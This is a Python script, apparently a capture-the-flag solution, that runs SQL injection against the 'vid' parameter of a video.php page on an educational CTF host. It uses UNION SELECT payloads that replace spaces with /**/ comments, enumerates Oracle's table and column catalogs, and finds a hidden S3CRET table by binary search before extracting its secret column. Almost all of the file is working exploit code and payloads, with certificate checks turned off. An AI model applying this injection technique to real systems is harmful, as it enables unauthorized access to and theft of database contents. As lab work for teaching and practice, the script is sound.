import re
import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
sess = requests.session()


def binary_search(target, l, r, func):
    while l != r:
        m = l + (r - l) // 2
        v = func(m)
        print('bsearch', l, r, m, v)
        if v < target:
            l = m + 1
        else:
            r = m
    if func(l) == target:
        return l
    return r


def request(payload):
    req = sess.get(
        'https://edu-ctf.csie.org:10159/video.php',
        params={'vid': payload},
        verify=False)

    try:
        r1 = [x for x in re.findall(r'<h2>([\s\S]*?)</h2>', req.content.decode())][1]
        r2 = [x for x in re.findall(r'src="([\s\S]*?)"', req.content.decode())][1]
        return r1, r2
    except:
        return None


# tpl_pre = lambda i: f'\
# -1/**/union/**/select/**/123,TABLE_NAME,null/**/from/**/ALL_TABLES/**/OFFSET/**/{i}/**/ROWS--'

# for i in range(108):
#     tbl = request(tpl_pre(i))[0]
#     if '$' not in tbl:
#         print(i, tbl)


tpl = lambda i: f'\
-1/**/union/**/select/**/123,TABLE_NAME,COLUMN_NAME/**/from/**/ALL_TAB_COLUMNS/**/OFFSET/**/{i}/**/ROWS--'
request_schema = lambda i: request(tpl(i))

idx = binary_search('S3CRET', 0, 50000, lambda i: request_schema(i)[0])
# idx = 18371

for i in range(idx, idx + 20):
    print(i, request_schema(i))
# 18371 S3CRET ID
# 18372 S3CRET V3RY_S3CRET_C0LUMN
# ...

# https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/123,V3RY_S3CRET_C0LUMN,null/**/from/**/S3CRET--
# extract in database
